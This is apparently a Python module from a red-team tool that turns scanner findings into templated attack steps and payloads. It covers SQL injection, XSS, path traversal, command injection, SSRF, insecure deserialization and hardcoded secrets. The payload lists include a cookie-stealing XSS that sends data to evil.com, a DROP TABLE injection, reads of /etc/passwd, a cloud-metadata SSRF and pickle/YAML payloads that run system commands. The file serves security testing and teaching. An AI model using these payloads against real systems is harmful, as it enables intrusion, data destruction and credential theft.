"""
RedTeamForge — Attack Engine
Given vulnerability findings, generates concrete attack simulation steps and payloads.
This is a rule-based engine — no actual exploitation is performed.
"""

from __future__ import annotations
import re
from dataclasses import dataclass, field


@dataclass
class AttackSimulation:
    vuln_name: str
    severity: str
    cwe: str
    steps: list[str] = field(default_factory=list)
    payloads: list[str] = field(default_factory=list)
    impact: str = ""


# ── Mapping: Semgrep rule-id patterns → attack templates ─────

_ATTACK_DB: list[dict] = [
    {
        "match": re.compile(r"sql[_-]?injection|sqli", re.IGNORECASE),
        "name": "SQL Injection",
        "severity": "CRITICAL",
        "cwe": "CWE-89",
        "impact": "Full database read/write, authentication bypass, data exfiltration.",
        "steps": [
            "1. Identify user-controlled input flowing into SQL query.",
            "2. Inject tautology payload to test for boolean-based blind SQLi.",
            "3. Use UNION-based injection to extract schema metadata.",
            "4. Escalate: dump credentials table.",
        ],
        "payloads": [
            "' OR '1'='1' --",
            "' UNION SELECT NULL, username, password FROM users --",
            "1; DROP TABLE users; --",
        ],
    },
    {
        "match": re.compile(r"xss|cross.site.script", re.IGNORECASE),
        "name": "Cross-Site Scripting (XSS)",
        "severity": "HIGH",
        "cwe": "CWE-79",
        "impact": "Session hijacking, credential theft, defacement.",
        "steps": [
            "1. Locate reflected/stored user input rendered without escaping.",
            "2. Inject script tag to verify execution context.",
            "3. Craft cookie-stealing payload targeting session tokens.",
        ],
        "payloads": [
            '<script>alert(document.cookie)</script>',
            '<img src=x onerror="fetch(\'https://evil.com/?c=\'+document.cookie)">',
            '"><svg/onload=alert(1)>',
        ],
    },
    {
        "match": re.compile(r"path.traversal|directory.traversal|lfi", re.IGNORECASE),
        "name": "Path Traversal / LFI",
        "severity": "HIGH",
        "cwe": "CWE-22",
        "impact": "Read arbitrary files on server, potential RCE via log poisoning.",
        "steps": [
            "1. Identify file path parameter controlled by the user.",
            "2. Inject traversal sequences to escape web root.",
            "3. Attempt to read /etc/passwd or equivalent.",
            "4. Escalate with log poisoning if PHP-based.",
        ],
        "payloads": [
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
        ],
    },
    {
        "match": re.compile(r"command[_-]?injection|os[_-]?command|rce", re.IGNORECASE),
        "name": "OS Command Injection",
        "severity": "CRITICAL",
        "cwe": "CWE-78",
        "impact": "Remote code execution, full server compromise.",
        "steps": [
            "1. Locate user input passed to subprocess/os.system/exec.",
            "2. Inject command separator to append arbitrary commands.",
            "3. Verify with benign payload (sleep/ping).",
            "4. Escalate with reverse shell payload.",
        ],
        "payloads": [
            "; id",
            "| cat /etc/passwd",
            "$(whoami)",
            "`sleep 5`",
        ],
    },
    {
        "match": re.compile(r"ssrf|server.side.request", re.IGNORECASE),
        "name": "Server-Side Request Forgery (SSRF)",
        "severity": "HIGH",
        "cwe": "CWE-918",
        "impact": "Internal network scanning, cloud metadata exfiltration, pivoting.",
        "steps": [
            "1. Identify URL parameter accepting user-controlled input.",
            "2. Point URL to internal metadata endpoint (169.254.169.254).",
            "3. Exfiltrate cloud credentials from metadata service.",
        ],
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:6379/",
            "http://127.0.0.1:80/admin",
        ],
    },
    {
        "match": re.compile(r"deserialization|pickle|yaml\.load", re.IGNORECASE),
        "name": "Insecure Deserialization",
        "severity": "CRITICAL",
        "cwe": "CWE-502",
        "impact": "Remote code execution via crafted serialized objects.",
        "steps": [
            "1. Identify deserialization of untrusted data (pickle, yaml.load).",
            "2. Craft malicious serialized payload.",
            "3. Trigger code execution on deserialization.",
        ],
        "payloads": [
            "import pickle; pickle.loads(b\"cos\\nsystem\\n(S'id'\\ntR.\")",
            "!!python/object/apply:os.system ['id']",
        ],
    },
    {
        "match": re.compile(r"hardcoded.secret|password|api[_-]?key", re.IGNORECASE),
        "name": "Hardcoded Secret / Credential Exposure",
        "severity": "HIGH",
        "cwe": "CWE-798",
        "impact": "Credential leakage, unauthorized API access, lateral movement.",
        "steps": [
            "1. Extract hardcoded credential from source code.",
            "2. Attempt authentication against target service.",
            "3. Enumerate accessible resources with stolen credential.",
        ],
        "payloads": [
            "(no payload — credential is already exposed in source)",
        ],
    },
]


def simulate_attacks(scan_results: str, fuzz_results: list[str] | None = None) -> list[AttackSimulation]:
    """
    Parse scan results text and generate attack simulations for each matching vulnerability class.
    """
    simulations: list[AttackSimulation] = []
    seen: set[str] = set()

    text = scan_results
    if fuzz_results:
        text += "\n".join(fuzz_results)

    for entry in _ATTACK_DB:
        if entry["match"].search(text) and entry["name"] not in seen:
            seen.add(entry["name"])
            simulations.append(AttackSimulation(
                vuln_name=entry["name"],
                severity=entry["severity"],
                cwe=entry["cwe"],
                steps=list(entry["steps"]),
                payloads=list(entry["payloads"]),
                impact=entry["impact"],
            ))

    return simulations
